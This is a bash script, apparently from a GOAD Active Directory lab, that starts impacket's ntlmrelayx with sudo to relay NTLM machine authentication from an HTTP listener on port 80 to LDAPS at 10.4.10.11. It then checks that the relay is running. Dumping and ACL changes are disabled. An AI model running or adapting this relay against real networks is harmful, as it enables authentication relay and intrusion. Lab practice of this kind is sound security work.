#!/usr/bin/env bash
# Start a mutation-disabled HTTP -> LDAPS relay for deterministic WS01 machine authentication.
set -euo pipefail

ROOT="${ROOT:-$HOME/Documents/GOAD_NOMAD}"
TARGET="${TARGET:-10.4.10.11}"
WORK="${WORK:-$HOME/.config/kingdoms/phase03-http-ldaps}"
LOG="$WORK/ntlmrelayx.log"
PIDFILE="$WORK/ntlmrelayx.pid"

find_ntlmrelayx() {
  local c
  for c in     "$(command -v impacket-ntlmrelayx 2>/dev/null || true)"     "$(command -v ntlmrelayx.py 2>/dev/null || true)"     /usr/share/doc/python3-impacket/examples/ntlmrelayx.py; do
    [[ -n "$c" && ( -f "$c" || -x "$c" ) ]] || continue
    printf '%s\n' "$c"
    return 0
  done
  return 1
}

cd "$ROOT"

bash "$ROOT/scripts/phase03/check-http-ldaps-readonly-relay.sh"

NTLMRELAYX="$(find_ntlmrelayx)"
sudo -v
umask 077
rm -rf -- "$WORK"
mkdir -p "$WORK"

sudo -n stdbuf -oL -eL "$NTLMRELAYX"   -t "ldaps://$TARGET"   --no-dump   --no-da   --no-acl   --no-smb-server   --no-wcf-server   --no-raw-server   >"$LOG" 2>&1 &

PID=$!
printf '%s\n' "$PID" >"$PIDFILE"

sleep 4

sudo kill -0 "$PID" 2>/dev/null || {
  echo 'FAIL: ntlmrelayx did not remain running' >&2
  cat "$LOG" >&2
  exit 1
}

sudo ss -H -lntp 2>/dev/null | grep -Eq ':80[[:space:]]' || {
  echo 'FAIL: ntlmrelayx HTTP listener is not active on TCP/80' >&2
  cat "$LOG" >&2
  exit 1
}

echo "TARGET=ldaps://$TARGET"
echo "LOG=$LOG"
echo "PID=$PID"
echo 'PHASE03_HTTP_LDAPS_RUNTIME_READY=True'
